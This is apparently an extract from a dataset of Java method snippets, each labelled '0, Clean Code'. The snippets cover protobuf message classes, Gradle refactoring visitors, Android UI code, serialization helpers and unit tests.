    if (!getSerializedData().equals(other.getSerializedData()))     return false;
  }
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"@Override public final RogueCommonBuffSelectSource forName(final CharSequence value){
switch (value.length()) {
case 41:
{
      if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_NONE"",value)) {
        return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_NONE;
      }
      if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_AEON"",value)) {
        return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_AEON;
      }
      break;
    }
case 46:
{
    if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_DICE_ROLL"",value)) {
      return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_DICE_ROLL;
    }
    break;
  }
case 48:
{
  if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_BOARD_EVENT"",value)) {
    return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_BOARD_EVENT;
  }
  break;
}
case 52:
{
if (ProtoUtil.isEqual(""ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_LEVEL_MECHANISM"",value)) {
  return ROGUE_COMMON_BUFF_SELECT_SOURCE_TYPE_LEVEL_MECHANISM;
}
break;
}
}
return null;
}",0,Clean Code
"@Override public DoGachaCsReq clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  gachaRandom=0;
  gachaId=0;
  simulateMagic=0;
  gachaNum=0;
  return this;
}",0,Clean Code
"@Override public String getThirdSourceId(){
  return this.mInfo.getThirdSourceId();
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.interop.tensorflow.protos.TensorFlowSequenceModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.interop.tensorflow.protos.TensorFlowSequenceModelProto other=(org.tribuo.interop.tensorflow.protos.TensorFlowSequenceModelProto)obj;
  if (hasMetadata() != other.hasMetadata())   return false;
  if (hasMetadata()) {
    if (!getMetadata().equals(other.getMetadata()))     return false;
  }
  if (!getModelDef().equals(other.getModelDef()))   return false;
  if (!internalGetTensors().equals(other.internalGetTensors()))   return false;
  if (hasFeatureConverter() != other.hasFeatureConverter())   return false;
  if (hasFeatureConverter()) {
    if (!getFeatureConverter().equals(other.getFeatureConverter()))     return false;
  }
  if (hasOutputConverter() != other.hasOutputConverter())   return false;
  if (hasOutputConverter()) {
    if (!getOutputConverter().equals(other.getOutputConverter()))     return false;
  }
  if (!getPredictOp().equals(other.getPredictOp()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",0,Clean Code
"private void startCapture(){
  if (captureBuffer == null) {
    captureBuffer=new StringBuilder();
  }
  captureStart=index - 1;
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(avatarId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=2;
  }
  return size;
}",0,Clean Code
"@Override public void handle(GameSession session,byte[] data) throws Exception {
  var req=DelMailCsReq.parseFrom(data);
  IntList deleted=session.getPlayer().getMailbox().deleteMail(req.getIdList());
  session.send(new PacketDelMailScRsp(deleted));
}
",0,Clean Code
"@Override public void init(){
  try {
    XposedHelpers.findClass(displayPowerControllerImpl,lpparam.classLoader);
    findAndHookConstructor(displayPowerControllerImpl,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        setDeclaredField(param,""SUPPORT_TEMEPERATURE_CONTROL"",false);
        setDeclaredField(param,""mThermalBrightnessControlAvailable"",false);
        setDeclaredField(param,""mApplyThermalBrightnessRate"",false);
      }
    }
);
  }
 catch (  XposedHelpers.ClassNotFoundError e) {
    logE(TAG,""android"",""No found class: "" + e);
  }
  try {
    XposedHelpers.findClass(automaticBrightnessControllerImpl,lpparam.classLoader);
    findAndHookConstructor(automaticBrightnessControllerImpl,new MethodHook(){
      @Override protected void after(      MethodHookParam param){
        setDeclaredField(param,""SUPPORT_TEMEPERATURE_CONTROL"",false);
      }
    }
);
  }
 catch (  XposedHelpers.ClassNotFoundError e) {
    logE(TAG,""android"",""No found class: "" + e);
  }
  try {
    findClassIfExists(temperatureController).getDeclaredMethod(""updateTemperature"");
    findAndHookMethod(temperatureController,""updateTemperature"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        param.setResult(null);
      }
    }
);
  }
 catch (  NoSuchMethodException e) {
    logE(TAG,""android"",""Don't Have updateTemperature: "" + e);
  }
  try {
    findClassIfExists(displayPowerControllerImpl).getDeclaredMethod(""updateThermalBrightness"",float.class);
    findAndHookMethod(displayPowerControllerImpl,""updateThermalBrightness"",float.class,new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        param.setResult(null);
      }
    }
);
  }
 catch (  NoSuchMethodException e) {
    logE(TAG,""android"",""Don't Have updateThermalBrightness: "" + e);
  }
  try {
    findClassIfExists(thermalBrightnessController).getDeclaredMethod(""updateThermalBrightnessIfNeeded"");
    findAndHookMethod(thermalBrightnessController,""updateThermalBrightnessIfNeeded"",new MethodHook(){
      @Override protected void before(      MethodHookParam param){
        param.setResult(false);
      }
    }
);
  }
 catch (  NoSuchMethodException e) {
    logE(TAG,""android"",""Don't Have updateThermalBrightnessIfNeeded: "" + e);
  }
}
",0,Clean Code
"private float getBreakDamage(Entity entity,boolean checkCrystalAge){
  if (!(entity instanceof EndCrystalEntity))   return 0;
  if (onlyBreakOwn.get() && !placedCrystals.contains(entity.getId()))   return 0;
  if (removed.contains(entity.getId()))   return 0;
  if (attemptedBreaks.get(entity.getId()) > breakAttempts.get())   return 0;
  if (checkCrystalAge && entity.age < ticksExisted.get())   return 0;
  if (isOutOfRange(entity.getPos(),entity.getBlockPos(),false))   return 0;
  blockPos.set(entity.getBlockPos()).move(0,-1,0);
  float selfDamage=DamageUtils.crystalDamage(mc.player,entity.getPos(),predictMovement.get(),blockPos);
  if (selfDamage > maxDamage.get() || (antiSuicide.get() && selfDamage >= EntityUtils.getTotalHealth(mc.player)))   return 0;
  float damage=getDamageToTargets(entity.getPos(),blockPos,true,false);
  boolean shouldFacePlace=shouldFacePlace();
  double minimumDamage=shouldFacePlace ? Math.min(minDamage.get(),1.5d) : minDamage.get();
  if (damage < minimumDamage)   return 0f;
  return damage;
}",0,Clean Code
"/** 
 * 涓�閿鏌ユ墍鏈塻ession鎴栬�卹efresh_token 澶辨晥鍙橀粍 骞舵洿鏂版墍鏈塧ccess_token鍜宻hare_token 骞堕噸鏂扮粍鎴恜ool_token
 * @return
 */
@Log @GetMapping(""updateAllToken"") public Result toUpdateAllToken(){
  try {
    String res=apiService.autoUpdateToken("""");
    if (res.contains(""鐢熸垚Token鎴愬姛"")) {
      try {
        String s=poolService.refreshAllPoolTokens();
        String s1=shareService.refreshAllShareTokens();
        return Result.success(res + s + s1);
      }
 catch (      Exception e) {
        return Result.success(res + ""<br>浣嗘槸鑷姩鏇存柊pool_token鍜宱neApi閲岀殑share_token澶辫触"");
      }
    }
  }
 catch (  Exception e) {
    throw new IllegalStateException(e);
  }
  return Result.error(""鐢熸垚access_token鍜宻hare_token澶辫触"");
}",0,Clean Code
"void visit(OceanBaseTableReference ref);
void visit(OceanBaseConstant constant);
void visit(OceanBaseColumnReference column);
void visit(OceanBaseUnaryPostfixOperation column);
void visit(OceanBaseComputableFunction f);
void visit(OceanBaseBinaryLogicalOperation op);
void visit(OceanBaseSelect select);
void visit(OceanBaseBinaryComparisonOperation op);
void visit(OceanBaseCastOperation op);
void visit(OceanBaseInOperation op);
void visit(OceanBaseOrderByTerm op);
void visit(OceanBaseExists op);
void visit(OceanBaseStringExpression op);
void visit(OceanBaseAggregate aggr);
void visit(OceanBaseColumnName c);
void visit(OceanBaseText fun);
void visit(OceanBaseUnaryPrefixOperation op);
default void visit(OceanBaseExpression expr){
  if (expr instanceof OceanBaseConstant) {
    visit((OceanBaseConstant)expr);
  }
 else   if (expr instanceof OceanBaseColumnReference) {
    visit((OceanBaseColumnReference)expr);
  }
 else   if (expr instanceof OceanBaseUnaryPostfixOperation) {
    visit((OceanBaseUnaryPostfixOperation)expr);
  }
 else   if (expr instanceof OceanBaseComputableFunction) {
    visit((OceanBaseComputableFunction)expr);
  }
 else   if (expr instanceof OceanBaseBinaryLogicalOperation) {
    visit((OceanBaseBinaryLogicalOperation)expr);
  }
 else   if (expr instanceof OceanBaseSelect) {
    visit((OceanBaseSelect)expr);
  }
 else   if (expr instanceof OceanBaseBinaryComparisonOperation) {
    visit((OceanBaseBinaryComparisonOperation)expr);
  }
 else   if (expr instanceof OceanBaseCastOperation) {
    visit((OceanBaseCastOperation)expr);
  }
 else   if (expr instanceof OceanBaseInOperation) {
    visit((OceanBaseInOperation)expr);
  }
 else   if (expr instanceof OceanBaseOrderByTerm) {
    visit((OceanBaseOrderByTerm)expr);
  }
 else   if (expr instanceof OceanBaseExists) {
    visit((OceanBaseExists)expr);
  }
 else   if (expr instanceof OceanBaseStringExpression) {
    visit((OceanBaseStringExpression)expr);
  }
 else   if (expr instanceof OceanBaseTableReference) {
    visit((OceanBaseTableReference)expr);
  }
 else   if (expr instanceof OceanBaseAggregate) {
    visit((OceanBaseAggregate)expr);
  }
 else   if (expr instanceof OceanBaseColumnName) {
    visit((OceanBaseColumnName)expr);
  }
 else   if (expr instanceof OceanBaseText) {
    visit((OceanBaseText)expr);
  }
 else   if (expr instanceof OceanBaseUnaryPrefixOperation) {
    visit((OceanBaseUnaryPrefixOperation)expr);
  }
 else {
    throw new AssertionError(expr);
  }
}
",0,Clean Code
"@Override public Schema getSchema(){
  return schema;
}
",0,Clean Code
"public void onLoad(){
}
",0,Clean Code
"@Override public void onTreeUpdate(){
  super.onTreeUpdate();
  if (mNodeJni == null || mNodeJni instanceof ARNode) {
    return;
  }
  if (mAnchorAttempt != null) {
    mAnchorAttempt.cancel();
  }
  ViewParent parent=getParent();
  if (parent instanceof VRTARScene) {
    if (mAnchor == null) {
      mAnchorAttempt=new AnchorAttempt(this,new Vector(mPosition));
      mAnchorAttempt.makeAttempt();
    }
  }
 else   if (mAnchor != null) {
    if (parent == null || !(parent instanceof VRTARScene)) {
      if (DEBUG_ANCHORING) {
        Log.i(TAG,""Anchored node "" + this + "" is being removed or repurposed, detaching anchor"");
      }
      mAnchor.detach();
      if (mNodeJni != null) {
        mNodeJni.setPosition(new Vector(mPosition));
      }
    }
  }
}
",0,Clean Code
"/** 
 * <code>optional .RogueCommonBuffSelectSource source = 6;</code>
 * @param value the source to set
 * @return this
 */
public RogueBuffSelectInfo setSource(final RogueCommonBuffSelectSourceOuterClass.RogueCommonBuffSelectSource value){
  bitField0_|=0x00000020;
  source=value.getNumber();
  return this;
}",0,Clean Code
"public void setCrossCursor(final boolean cross){
  if (cross) {
    super.setViewCursor(Cursor.getPredefinedCursor(Cursor.MOVE_CURSOR));
  }
 else {
    super.setViewCursor(Cursor.getDefaultCursor());
  }
}
",0,Clean Code
"@Override protected void processElement(SourceRecord element,SourceOutput<T> output,SourceSplitState splitState) throws Exception {
  if (isWatermarkEvent(element)) {
    LOG.debug(""PostgresSourceRecordEmitter Process WatermarkEvent: {}; splitState = {}"",element,splitState);
    Offset watermark=super.getOffsetPosition(element);
    if (isHighWatermarkEvent(element) && splitState.isSnapshotSplitState()) {
      LOG.info(""PostgresSourceRecordEmitter Set HighWatermark {} for {}"",watermark,splitState);
      splitState.asSnapshotSplitState().setHighWatermark(watermark);
    }
  }
 else   if (isSchemaChangeEvent(element) && splitState.isStreamSplitState()) {
    LOG.debug(""PostgresSourceRecordEmitter Process SchemaChangeEvent: {}; splitState = {}"",element,splitState);
    HistoryRecord historyRecord=getHistoryRecord(element);
    Array tableChanges=historyRecord.document().getArray(HistoryRecord.Fields.TABLE_CHANGES);
    TableChanges changes=TABLE_CHANGE_SERIALIZER.deserialize(tableChanges,true);
    for (    TableChanges.TableChange tableChange : changes) {
      splitState.asStreamSplitState().recordSchema(tableChange.getId(),tableChange);
    }
    if (includeSchemaChanges) {
      emitElement(element,output);
    }
  }
 else   if (isDataChangeRecord(element)) {
    LOG.debug(""PostgresSourceRecordEmitter Process DataChangeRecord: {}; splitState = {}"",element,splitState);
    updateStartingOffsetForSplit(splitState,element);
    reportMetrics(element);
    final Map<TableId,TableChange> tableSchemas=splitState.getSourceSplitBase().getTableSchemas();
    final TableChange tableSchema=tableSchemas.getOrDefault(RecordUtils.getTableId(element),null);
    debeziumDeserializationSchema.deserialize(element,new Collector<T>(){
      @Override public void collect(      T record){
        Struct value=(Struct)element.value();
        Struct source=value.getStruct(Envelope.FieldName.SOURCE);
        String dbName=source.getString(AbstractSourceInfo.DATABASE_NAME_KEY);
        String schemaName=source.getString(AbstractSourceInfo.SCHEMA_NAME_KEY);
        String tableName=source.getString(AbstractSourceInfo.TABLE_NAME_KEY);
        sourceReaderMetrics.outputMetrics(dbName,schemaName,tableName,splitState.isSnapshotSplitState(),value);
        output.collect(record);
      }
      @Override public void close(){
      }
    }
,tableSchema);
  }
 else   if (isHeartbeatEvent(element)) {
    LOG.debug(""PostgresSourceRecordEmitterProcess Heartbeat: {}; splitState = {}"",element,splitState);
    updateStartingOffsetForSplit(splitState,element);
  }
 else {
    LOG.info(""Meet unknown element {} for splitState = {}, just skip."",element,splitState);
  }
}
",0,Clean Code
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!dependencyDsl.matches(m) || !(StringUtils.isBlank(configuration) || m.getSimpleName().equals(configuration))) {
    return m;
  }
  List<Expression> depArgs=m.getArguments();
  if (depArgs.get(0) instanceof J.Literal) {
    String gav=(String)((J.Literal)depArgs.get(0)).getValue();
    if (gav != null) {
      Dependency dependency=DependencyStringNotationConverter.parse(gav);
      if (!newExtension.equals(dependency.getExt()) && ((dependency.getVersion() == null && depMatcher.matches(dependency.getGroupId(),dependency.getArtifactId())) || (dependency.getVersion() != null && depMatcher.matches(dependency.getGroupId(),dependency.getArtifactId(),dependency.getVersion())))) {
        Dependency newDependency=dependency.withExt(newExtension);
        m=m.withArguments(ListUtils.mapFirst(m.getArguments(),arg -> ChangeStringLiteral.withStringValue((J.Literal)arg,newDependency.toStringNotation())));
      }
    }
  }
 else   if (depArgs.get(0) instanceof G.MapEntry) {
    G.MapEntry extensionEntry=null;
    String groupId=null;
    String artifactId=null;
    String version=null;
    String extension=null;
    String extensionStringDelimiter=""'"";
    for (    Expression e : depArgs) {
      if (!(e instanceof G.MapEntry)) {
        continue;
      }
      G.MapEntry arg=(G.MapEntry)e;
      if (!(arg.getKey() instanceof J.Literal) || !(arg.getValue() instanceof J.Literal)) {
        continue;
      }
      J.Literal key=(J.Literal)arg.getKey();
      J.Literal value=(J.Literal)arg.getValue();
      if (!(key.getValue() instanceof String) || !(value.getValue() instanceof String)) {
        continue;
      }
      String keyValue=(String)key.getValue();
      String valueValue=(String)value.getValue();
      if (""group"".equals(keyValue)) {
        groupId=valueValue;
      }
 else       if (""name"".equals(keyValue)) {
        artifactId=valueValue;
      }
 else       if (""version"".equals(keyValue)) {
        version=valueValue;
      }
 else       if (""ext"".equals(keyValue) && !newExtension.equals(valueValue)) {
        if (value.getValueSource() != null) {
          extensionStringDelimiter=value.getValueSource().substring(0,value.getValueSource().indexOf(valueValue));
        }
        extensionEntry=arg;
        extension=valueValue;
      }
    }
    if (groupId == null || artifactId == null || (version == null && !depMatcher.matches(groupId,artifactId)) || (version != null && !depMatcher.matches(groupId,artifactId,version)) || extension == null) {
      return m;
    }
    String delimiter=extensionStringDelimiter;
    G.MapEntry finalExtension=extensionEntry;
    m=m.withArguments(ListUtils.map(m.getArguments(),arg -> {
      if (arg == finalExtension) {
        return finalExtension.withValue(((J.Literal)finalExtension.getValue()).withValue(newExtension).withValueSource(delimiter + newExtension + delimiter));
      }
      return arg;
    }
));
  }
  return m;
}",0,Clean Code
"private void getSelectionPath(Layout layout,int start,int end){
  if (start == end) {
    return;
  }
  if (end < start) {
    int temp=end;
    end=start;
    start=temp;
  }
  final int startline=layout.getLineForOffset(start);
  final int endline=layout.getLineForOffset(end);
  for (int line=startline; line <= endline; ++line) {
    final int lineStart=layout.getLineStart(line);
    final int lineEnd=layout.getLineEnd(line);
    if (lineEnd == lineStart)     continue;
    if (lineStart + 1 == lineEnd && Character.isWhitespace(layout.getText().charAt(lineStart)))     continue;
    final float left, right;
    if (line == startline && start > lineStart) {
      left=layout.getPrimaryHorizontal(start);
    }
 else {
      left=layout.getLineLeft(line);
    }
    if (line == endline && end < lineEnd) {
      right=layout.getPrimaryHorizontal(end);
    }
 else {
      right=layout.getLineRight(line);
    }
    addRect(Math.min(left,right),layout.getLineTop(line),Math.max(left,right),layout.getLineBottom(line));
  }
}",0,Clean Code
"public static ChessRogueStartScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ChessRogueStartScRsp(),data).checkInitialized();
}
public static ChessRogueStartScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ChessRogueStartScRsp(),input).checkInitialized();
}
public static ChessRogueStartScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ChessRogueStartScRsp(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * 鎸戦�夊綋鍓嶆満鍣ㄩ渶瑕佹墽琛岀殑浠诲姟
 * @param allTaskList 鎵�鏈夌殑浠诲姟
 * @return 闇�瑕佹墽琛岀殑浠诲姟
 */
private List<E> selectTask(List<E> allTaskList,List<String> allWorkCodes,String currentWorkerCode){
  if (ValidateUtils.isEmptyList(allTaskList)) {
    return new ArrayList<>();
  }
  if (ValidateUtils.isEmptyList(allWorkCodes) || ValidateUtils.isBlank(currentWorkerCode)) {
    LOGGER.warn(""task running, but without registrant, and so scheduled tasks can't execute, taskName:{}."",taskName);
    return new ArrayList<>();
  }
  Collections.sort(allTaskList);
  Collections.sort(allWorkCodes);
  int idx=0;
  while (idx < allWorkCodes.size()) {
    if (allWorkCodes.get(idx).equals(currentWorkerCode)) {
      break;
    }
    idx+=1;
  }
  if (idx == allWorkCodes.size()) {
    LOGGER.debug(""task running, registrants not conclude present machine, taskName:{}."",taskName);
    return new ArrayList<>();
  }
  int count=allTaskList.size() / allWorkCodes.size();
  if (allTaskList.size() % allWorkCodes.size() != 0) {
    count+=1;
  }
  if (idx * count >= allTaskList.size()) {
    return new ArrayList<>();
  }
  return allTaskList.subList(idx * count,Math.min(idx * count + count,allTaskList.size()));
}",0,Clean Code
"/** 
 * Compute the amount to scroll in the Y direction in order to get a rectangle completely on the screen (or, if taller than the screen, at least the first screen size chunk of it).
 * @param rect The rect.
 * @return The scroll delta.
 */
protected int computeScrollDeltaToGetChildRectOnScreenV(Rect rect){
  if (getChildCount() == 0)   return 0;
  int height=getHeight();
  int screenTop=getScrollY();
  int screenBottom=screenTop + height;
  int fadingEdge=getVerticalFadingEdgeLength();
  if (rect.top > 0) {
    screenTop+=fadingEdge;
  }
  if (rect.bottom < getChildAt(0).getHeight()) {
    screenBottom-=fadingEdge;
  }
  int scrollYDelta=0;
  if (rect.bottom > screenBottom && rect.top > screenTop) {
    if (rect.height() > height) {
      scrollYDelta+=(rect.top - screenTop);
    }
 else {
      scrollYDelta+=(rect.bottom - screenBottom);
    }
    int bottom=getChildAt(0).getBottom();
    int distanceToBottom=bottom - screenBottom;
    scrollYDelta=Math.min(scrollYDelta,distanceToBottom);
  }
 else   if (rect.top < screenTop && rect.bottom < screenBottom) {
    if (rect.height() > height) {
      scrollYDelta-=(screenBottom - rect.bottom);
    }
 else {
      scrollYDelta-=(screenTop - rect.top);
    }
    scrollYDelta=Math.max(scrollYDelta,-getScrollY());
  }
  return scrollYDelta;
}",0,Clean Code
"@Override public BattleRelic copyFrom(final BattleRelic other){
  cachedSize=other.cachedSize;
  if ((bitField0_ | other.bitField0_) != 0) {
    bitField0_=other.bitField0_;
    id=other.id;
    level=other.level;
    mainAffixId=other.mainAffixId;
    uniqueId=other.uniqueId;
    subAffixList.copyFrom(other.subAffixList);
  }
  return this;
}",0,Clean Code
"/** 
 * <code>repeated .FriendRecommendInfo friend_recommend_list = 9;</code>
 * @return this
 */
public GetFriendRecommendListInfoScRsp clearFriendRecommendList(){
  bitField0_&=~0x00000002;
  friendRecommendList.clear();
  return this;
}",0,Clean Code
"/** 
 * Returns the deserializer for a class.
 * @param cl the class of the object that needs to be deserialized.
 * @return a deserializer object for the serialization.
 */
public Deserializer getDeserializer(Class cl) throws HessianProtocolException {
  Deserializer deserializer;
  if (_cachedDeserializerMap != null) {
    deserializer=(Deserializer)_cachedDeserializerMap.get(cl);
    if (deserializer != null)     return deserializer;
  }
  deserializer=loadDeserializer(cl);
  if (_cachedDeserializerMap == null)   _cachedDeserializerMap=new ConcurrentHashMap(8);
  _cachedDeserializerMap.put(cl,deserializer);
  return deserializer;
}
/** 
 * Returns a deserializer based on a string type.
 */
public Deserializer getDeserializer(String type) throws HessianProtocolException {
  if (type == null || type.equals(""""))   return null;
  Deserializer deserializer;
  if (_cachedTypeDeserializerMap != null) {
synchronized (_cachedTypeDeserializerMap) {
      deserializer=(Deserializer)_cachedTypeDeserializerMap.get(type);
    }
    if (deserializer != null)     return deserializer;
  }
  deserializer=(Deserializer)_staticTypeMap.get(type);
  if (deserializer != null)   return deserializer;
  if (type.startsWith(""["")) {
    Deserializer subDeserializer=getDeserializer(type.substring(1));
    if (subDeserializer != null)     deserializer=new ArrayDeserializer(subDeserializer.getType());
 else     deserializer=new ArrayDeserializer(Object.class);
  }
 else {
    try {
      Class cl;
      if (type.startsWith(""com.caucho.hessian"")) {
        cl=this.getClass().getClassLoader().loadClass(type);
      }
 else {
        cl=loadSerializedClass(type);
      }
      deserializer=getDeserializer(cl);
    }
 catch (    Exception e) {
      log.warning(""Hessian/Burlap: '"" + type + ""' is an unknown class in ""+ getClassLoader()+ "":\n""+ e);
      log.log(Level.FINER,e.toString(),e);
    }
  }
  if (deserializer != null) {
    if (_cachedTypeDeserializerMap == null)     _cachedTypeDeserializerMap=new HashMap(8);
synchronized (_cachedTypeDeserializerMap) {
      _cachedTypeDeserializerMap.put(type,deserializer);
    }
  }
  return deserializer;
}",0,Clean Code
"@Nullable private GradleDependencyConfiguration constraintConfiguration(GradleDependencyConfiguration config){
  String constraintConfigName=config.getName();
switch (constraintConfigName) {
case ""compileClasspath"":
case ""compileOnly"":
case ""compile"":
    constraintConfigName=""implementation"";
  break;
case ""runtimeClasspath"":
case ""runtime"":
constraintConfigName=""runtimeOnly"";
break;
case ""testCompileClasspath"":
case ""testCompile"":
constraintConfigName=""testImplementation"";
break;
case ""testRuntimeClasspath"":
case ""testRuntime"":
constraintConfigName=""testRuntimeOnly"";
break;
}
GradleDependencyConfiguration configuration=gradleProject.getConfiguration(constraintConfigName);
if (configuration != null && configuration.isTransitive()) {
return configuration;
}
return null;
}
",0,Clean Code
"@Test public void verifyAndRepairParentWorkflow(){
  WorkflowModel workflow=new WorkflowModel();
  workflow.setWorkflowId(""abcd"");
  workflow.setParentWorkflowId(""parentWorkflowId"");
  when(properties.getWorkflowOffsetTimeout()).thenReturn(Duration.ofSeconds(10));
  when(executionDAO.getWorkflow(""abcd"",true)).thenReturn(workflow);
  when(queueDAO.containsMessage(anyString(),anyString())).thenReturn(false);
  workflowRepairService.verifyAndRepairWorkflowTasks(""abcd"");
  verify(queueDAO,times(1)).containsMessage(anyString(),anyString());
  verify(queueDAO,times(1)).push(anyString(),anyString(),anyLong());
}",0,Clean Code
"@Override public ChessRogueNousSubStoryInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"public AzureOpenAiStreamClient.Builder apiKey(String apiKeyValue){
  this.apiKey=apiKeyValue;
  return this;
}
",0,Clean Code
"@Override public boolean onTouchEvent(MotionEvent event){
  if (tabs == null || bounds == null)   return false;
  int index=-1;
  for (int i=0; i < bounds.length; ++i) {
    if (bounds[i].contains(event.getX(),event.getY())) {
      index=i;
      break;
    }
  }
  if (index >= 0 && index != lastPressedIndex) {
    lastPressedIndex=index;
    if (onTabClick != null) {
      onTabClick.run(index);
    }
  }
  if (event.getAction() == MotionEvent.ACTION_UP || event.getAction() == MotionEvent.ACTION_CANCEL) {
    lastPressedIndex=-1;
  }
  if (event.getAction() == MotionEvent.ACTION_DOWN && index >= 0) {
    return true;
  }
  return super.onTouchEvent(event);
}",0,Clean Code
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,P p){
  J.MethodDeclaration m=super.visitMethodDeclaration(method,p);
  m=m.withLeadingAnnotations(withNewlines(m.getLeadingAnnotations()));
  if (!m.getLeadingAnnotations().isEmpty()) {
    if (!m.getModifiers().isEmpty()) {
      m=m.withModifiers(withNewline(m.getModifiers()));
    }
 else     if (m.getAnnotations().getTypeParameters() != null) {
      if (!m.getAnnotations().getTypeParameters().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.getAnnotations().withTypeParameters(m.getAnnotations().getTypeParameters().withPrefix(withNewline(m.getAnnotations().getTypeParameters().getPrefix())));
      }
    }
 else     if (m.getReturnTypeExpression() != null) {
      if (!m.getReturnTypeExpression().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.withReturnTypeExpression(m.getReturnTypeExpression().withPrefix(withNewline(m.getReturnTypeExpression().getPrefix())));
      }
    }
 else {
      if (!m.getName().getPrefix().getWhitespace().contains(""\n"")) {
        m=m.withName(m.getName().withPrefix(withNewline(m.getName().getPrefix())));
      }
    }
  }
  return m;
}
",0,Clean Code
"@Override public Builder toBuilder(){
  return this == DEFAULT_INSTANCE ? new Builder() : new Builder().mergeFrom(this);
}
",0,Clean Code
"public static RotatorEnergyInfo parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),data).checkInitialized();
}
public static RotatorEnergyInfo parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),input).checkInitialized();
}
public static RotatorEnergyInfo parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new RotatorEnergyInfo(),input).checkInitialized();
}
",0,Clean Code
"public Builder userName(String userName){
  this.userName=userName;
  return this;
}
",0,Clean Code
"public ConverterImpl(Type firstTargetType,Type secondTargetType){
  this.firstTargetType=firstTargetType;
  this.secondTargetType=secondTargetType;
}
",0,Clean Code
"/** 
 * <code>repeated .HeroBasicTypeInfo basic_type_info_list = 9;</code>
 * @return this
 */
public GetHeroBasicTypeInfoScRsp clearBasicTypeInfoList(){
  bitField0_&=~0x00000008;
  basicTypeInfoList.clear();
  return this;
}",0,Clean Code
"@Test void should_split_sample_text_without_paragraphs(){
  int maxSegmentSize=100;
  Tokenizer tokenizer=new OpenAiTokenizer(GPT_3_5_TURBO);
  String segment1=""In a small town nestled between two vast mountains, there was a shop unlike any other. "" + ""A unique haven. "" + ""Visitors would often comment on its peculiar charm, always slightly different from what they ""+ ""remembered on their previous visits. ""+ ""The store stood as a testament to the passage of time and the ever-changing landscape of tales. ""+ ""Upon entering, the first thing to strike you was the enormity of it all. ""+ ""Every inch of space was occupied with books."";
  String segment2=""Some stood tall and regal on the highest shelves, "" + ""looking as if they had witnessed epochs come and go. "" + ""They were leather-bound, with pages yellowed by age. ""+ ""Others, smaller and brightly adorned, were reminiscent of summer days and childhood laughter. ""+ ""But these physical objects were mere vessels. ""+ ""It was the stories inside that held power. ""+ ""Mrs. Jenkins ran the shop. ""+ ""A mystery in her own right."";
  String segment3=""Her silver hair cascaded like a waterfall, and her eyes seemed to see more than most. "" + ""With just a glance, she'd find the perfect story for you. "" + ""One wet afternoon, Eli entered. ""+ ""He was just a boy, lost in the vastness of the store. ""+ ""Between the aisles, his small fingers danced on the spines of books, feeling the heartbeat of ""+ ""countless tales. ""+ ""Then, a simple brown-covered book whispered to him."";
  String segment4=""Without grandeur or pretense, it beckoned. "" + ""And he listened. "" + ""He read. ""+ ""And read. ""+ ""The world around him melted. ""+ ""When Mrs. Jenkins approached, night had fallen. ""+ ""She gently remarked, \""Books have a way of finding their reader.\"" ""+ ""Eli simply nodded, understanding the profound truth in her words. ""+ ""Some places and stories remain etched in our souls, offering lessons and moments of sheer wonder. ""+ ""They defy definition."";
  Document document=Document.from(format(""%s %s %s %s"",segment1,segment2,segment3,segment4),metadata(""document"",""0""));
  DocumentSplitter splitter=new DocumentByParagraphSplitter(maxSegmentSize,0,tokenizer);
  List<TextSegment> segments=splitter.split(document);
  segments.forEach(segment -> assertThat(tokenizer.estimateTokenCountInText(segment.text())).isLessThanOrEqualTo(maxSegmentSize));
  assertThat(segments).containsExactly(textSegment(segment1,metadata(""index"",""0"").add(""document"",""0"")),textSegment(segment2,metadata(""index"",""1"").add(""document"",""0"")),textSegment(segment3,metadata(""index"",""2"").add(""document"",""0"")),textSegment(segment4,metadata(""index"",""3"").add(""document"",""0"")));
}",0,Clean Code
"public static int[] calcDrawableColor(Drawable drawable){
  int bitmapColor=0xff000000;
  int[] result=new int[4];
  try {
    if (drawable instanceof BitmapDrawable) {
      Bitmap bitmap=((BitmapDrawable)drawable).getBitmap();
      bitmapColor=calcBitmapColor(bitmap);
    }
 else     if (drawable instanceof ColorDrawable) {
      bitmapColor=((ColorDrawable)drawable).getColor();
    }
 else     if (drawable instanceof BackgroundGradientDrawable) {
